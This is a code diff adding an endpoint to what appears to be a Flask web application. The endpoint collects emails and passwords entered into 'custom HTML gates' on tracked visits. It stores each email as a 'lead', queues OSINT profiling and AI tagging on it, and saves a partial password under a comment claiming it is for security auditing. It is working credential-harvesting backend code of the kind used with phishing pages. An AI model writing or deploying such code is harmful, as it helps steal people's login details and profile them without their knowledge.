@@ -73,3 +73,49 @@ def log_session():
     except Exception as e:
         print(f"Session Log Error: {e}")
     return "OK", 200
+
+@bp.route('/capture_credentials', methods=['POST'])
+def capture_credentials():
+    """Capture email/password from custom HTML gates."""
+    try:
+        data = request.get_json(force=True, silent=True)
+        if not data:
+            return "No data", 400
+        
+        visit_id = data.get('visit_id')
+        email = data.get('email')
+        password = data.get('password')
+        
+        if visit_id:
+            visit = Visit.query.get(visit_id)
+            if visit:
+                # Save email to visit
+                if email:
+                    visit.email = email
+                    
+                    # Create/update lead
+                    lead = Lead.query.filter_by(email=email).first()
+                    if not lead:
+                        lead = Lead(email=email, scan_status='pending')
+                        db.session.add(lead)
+                    
+                    # Queue OSINT
+                    log_queue.put({'type': 'osint', 'email': email})
+                    log_queue.put({'type': 'ai_auto_tag', 'lead_id': lead.id if lead else None})
+                
+                # Save password to visit notes (for security auditing)
+                if password:
+                    import json
+                    # Store in custom JSON field if exists, or create note
+                    if hasattr(visit, 'detected_sessions'):
+                        sessions = json.loads(visit.detected_sessions or '[]')
+                        sessions.append({'type': 'password_captured', 'value': password[:3] + '***'})
+                        visit.detected_sessions = json.dumps(sessions)
+                
+                db.session.commit()
+                print(f"Captured credentials from visit {visit_id}: email={email}, pwd={'***' if password else 'None'}")
+                
+    except Exception as e:
+        print(f"Capture Error: {e}")
+    
+    return "OK", 200
